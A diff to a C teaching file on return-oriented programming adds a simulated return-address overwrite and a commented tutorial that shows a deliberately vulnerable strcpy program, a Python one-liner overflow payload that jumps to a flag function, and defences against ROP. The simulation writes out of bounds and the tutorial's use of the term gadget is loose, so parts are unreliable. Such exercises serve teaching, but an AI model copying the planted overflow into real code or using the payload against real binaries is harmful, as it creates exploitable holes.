@@ -13,6 +13,41 @@
 #include <stdlib.h>
 #include <string.h>
 
+void print_flag() {
+  printf("You've reached the secret function! The flag is: FLAG{ROP_SUCCESS}\n");
+}
+
+void vulnerable_function() {
+  char buffer[64];
+  void (*ret)() = print_flag;  // Direct function pointer for demonstration
+
+  // Simulate automatic overflow
+  // This block mimics what would be user input but is done programmatically
+  memset(buffer, 'A', sizeof(buffer));  // Fill the buffer with 'A'
+  
+  // Automatically overwrite the return address
+  memcpy(buffer + sizeof(buffer), &ret, sizeof(ret));
+
+  // Display the buffer and the overwritten return address for debugging
+  printf("Buffer content: %s\n", buffer);
+  printf("Overwritten return address: %p\n", *(void **)(buffer + sizeof(buffer)));
+
+  // Normally, the program would return here, but we simulate the call to the new return address
+  ((void(*)())*(void **)(buffer + sizeof(buffer)))();
+}
+
+int main() {
+  printf("Starting the automated control flow attack simulation.\n");
+  vulnerable_function();
+  printf("Exiting the program.\n");
+  return EXIT_SUCCESS;
+}
+
+/*
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
 // Dummy functions to represent gadgets
 void gadget1() { printf("Gadget 1: Pop eax; ret\n"); }  // Example operation
 void gadget2() { printf("Gadget 2: Pop ebx; ret\n"); }  // Example operation
@@ -43,6 +78,7 @@ int main() {
   printf("If no crash, the ROP chain executed correctly.\n");
   return 0;
 }
+*/
 
 /*
 #include <stdio.h>
@@ -141,3 +177,109 @@ int main() {
     return 0;
 }
 */
+
+// ----------------------------------------------------------------------------
+// ============================================================================
+// ----------------------------------------------------------------------------
+// ============================================================================
+
+/*
+
+Return-Oriented Programming (ROP) is a sophisticated attack technique that allows an attacker to execute code by chaining together short sequences of instructions, called "gadgets," which are already present in a program’s memory. These gadgets typically end with a `ret` instruction, allowing the attacker to control the flow of execution by manipulating the stack.
+
+### Designing a Simple ROP Vulnerability
+
+To demonstrate a ROP vulnerability, we can create a scenario where:
+
+1. **A Buffer Overflow** allows the attacker to overwrite the return address on the stack.
+2. **Gadgets** are identified within the program’s memory, allowing the attacker to execute arbitrary code.
+
+### Step-by-Step Example:
+
+#### 1. Vulnerable Function
+
+Let's start by creating a function that has a buffer overflow vulnerability:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void print_flag() {
+    printf("You've reached the secret function! The flag is: FLAG{ROP_SUCCESS}\n");
+}
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    
+    // Vulnerability: no bounds checking on the input
+    strcpy(buffer, input);
+
+    printf("Buffer content: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <input>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Calling vulnerable_function...\n");
+    vulnerable_function(argv[1]);
+    printf("Returned from vulnerable_function\n");
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### 2. Understanding the Vulnerability
+
+- **Buffer Overflow**: The function `vulnerable_function` uses `strcpy` to copy user input into `buffer` without checking the size. This allows the input to overflow the buffer and overwrite the return address on the stack.
+
+- **Target**: The goal is to overwrite the return address with the address of the `print_flag` function so that when `vulnerable_function` returns, it jumps to `print_flag`.
+
+#### 3. Identifying Gadgets
+
+In a real-world scenario, an attacker would analyze the binary to find gadgets. Here, the simplest gadget is the address of the `print_flag` function, which ends with a `ret` instruction. This allows the attacker to redirect execution directly to `print_flag`.
+
+#### 4. Exploiting the Vulnerability
+
+To exploit this, an attacker would craft an input that:
+- Fills the `buffer`.
+- Overwrites the return address with the address of `print_flag`.
+
+Let’s say the address of `print_flag` is `0x080484b6` (this is an example address, the actual address would depend on the binary and memory layout).
+
+To construct the input:
+- The first 64 bytes (or more if needed to reach the return address) would be filler (e.g., "A").
+- The next 4 bytes would be the address of `print_flag` in little-endian format.
+
+#### 5. Running the Exploit
+
+If we compile and run this program:
+
+```bash
+gcc -o rop_example rop_example.c
+./rop_example $(python -c 'print "A"*64 + "\xb6\x84\x04\x08"')
+```
+
+The input overflows the buffer and overwrites the return address with `0x080484b6`, causing the program to execute `print_flag` instead of returning normally.
+
+#### 6. Preventing ROP Attacks
+
+Modern systems have several defenses against ROP attacks, including:
+
+- **Stack Canaries**: Detects changes to the stack before function return.
+- **ASLR (Address Space Layout Randomization)**: Randomizes memory addresses, making it harder to predict where gadgets are located.
+- **DEP/NX (Data Execution Prevention/No Execute)**: Prevents execution of code on the stack or heap.
+- **Control Flow Integrity (CFI)**: Ensures that the program’s control flow follows a valid path.
+
+### Summary
+
+The provided example demonstrates how a buffer overflow can lead to a Return-Oriented Programming (ROP) attack by allowing an attacker to overwrite the return address and redirect execution. ROP attacks are powerful because they allow arbitrary code execution without injecting new code, making them harder to detect.
+
+If you'd like to explore this further, such as implementing and testing the ROP attack in more depth, or discuss ways to defend against such attacks, feel free to ask!
+
+*/
+
+// ============================================================================
